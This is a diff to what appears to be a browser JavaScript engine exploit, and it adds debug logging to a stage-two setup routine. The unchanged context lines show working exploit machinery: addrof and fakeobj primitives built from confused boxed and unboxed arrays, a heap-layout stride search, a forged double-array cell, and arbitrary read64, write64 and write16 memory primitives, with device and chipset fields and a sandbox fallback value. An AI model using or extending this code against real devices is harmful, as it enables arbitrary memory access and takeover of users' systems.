@@ -18298,6 +18298,7 @@ const device_chipset = {
         }
         function setup_stage2_prim()
         {
+          print("setup_stage2: begin");
           p.addrof = function addrof(o) {
             boxed_arr[0] = o;
             return BigInt.fromDouble(unboxed_arr[0]);
@@ -18306,35 +18307,49 @@ const device_chipset = {
             unboxed_arr[0] = addr.asDouble();
             return boxed_arr[0];
           }
+          print("setup_stage2: addrof/fakeobj installed");
+          const addrofSelfTest = { marker: 0x41414141 };
+          const addrofSelfTestAddr = p.addrof(addrofSelfTest);
+          print(`setup_stage2: addrof self-test=${addrofSelfTestAddr.hex()}`);
           let scribble_element;
           let scribbles = [];
           let prev_addr = 0n;
+          print("setup_stage2: stride search begin");
           for (let i = 0; i < 1000; ++i) {
             let o = {
               p1: 1.1,
               p2: 2.2
             };
-            if (p.addrof(o) - prev_addr === 0x20n) {
+            const current_addr = p.addrof(o);
+            if (current_addr - prev_addr === 0x20n) {
               scribble_element = o;
+              print(`setup_stage2: stride hit i=${i} addr=${current_addr.hex()} prev=${prev_addr.hex()}`);
               break;
             }
             scribbles.push(o);
-            prev_addr = p.addrof(o);
+            prev_addr = current_addr;
           }
           if (!scribble_element) {
             print("scribble_element: allocation stride miss after 1000 attempts");
             throw new Error("scribble_element allocation failed");
           }
+          print("setup_stage2: building change_scribble_holder");
           let change_scribble_holder = {
             p1: p.fakeobj(0x108240700000000n),
             p2: scribble_element
           };
+          print("setup_stage2: creating change_scribble");
           let change_scribble = p.fakeobj(p.addrof(change_scribble_holder) + 0x10n);
+          print("setup_stage2: change_scribble created");
           scribble_element.p3 = 1.1;
           scribble_element[0] = 1.1;
+          print("setup_stage2: reading double_array_cell");
           let double_array_cell = BigInt.fromDouble(change_scribble[0]);
+          print(`setup_stage2: double_array_cell=${double_array_cell.hex()}`);
+          print("setup_stage2: installing fake double array cell");
           change_scribble_holder.p1 = p.fakeobj(double_array_cell);
           const original_cell = change_scribble[0];
+          print(`setup_stage2: original_cell=${BigInt.fromDouble(original_cell).hex()}`);
           p.write64 = function (addr, value) {
             change_scribble[0] = original_cell;
             change_scribble[1] = (addr + 0x10n).asDouble();
@@ -18355,16 +18370,20 @@ const device_chipset = {
               p.write64(off_addr, off_val);
             }
           };
+          print("setup_stage2: write64 installed");
           p.write16 = function (ptr, u16) {
             let value = p.read64(ptr);
             value &= ~0xffffn;
             value |= u16;
             p.write64(ptr, value);
           };
+          print("setup_stage2: pointing read64 backing store");
           change_scribble[1] = p.addrof(read64_biguint64arr).add(8n).asDouble();
           let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
+          print(`setup_stage2: read64_float64arr_bytes=${read64_float64arr_bytes.hex()}`);
           read64_biguint64arr[0] = 0x10000000006n;
           read64_biguint64arr[1] = read64_float64arr_bytes.add(0x10n);
+          print("setup_stage2: pointing read64 string");
           change_scribble[1] = p.addrof(read64_str).add(8n).asDouble();
           scribble_element[0] = read64_float64arr_bytes.asDouble();
           p.read64 = function (addr) {
@@ -18381,6 +18400,7 @@ const device_chipset = {
             value |= u16;
             p.write64(ptr, value);
           };
+          print("setup_stage2: read/write helpers installed");
           p.device_model = device_model;
           p.chipset = chipset;
           p.sbx0_fallback_start = isFinite(globalThis.__ls_sbx0_fallback_start) ? globalThis.__ls_sbx0_fallback_start : 0;
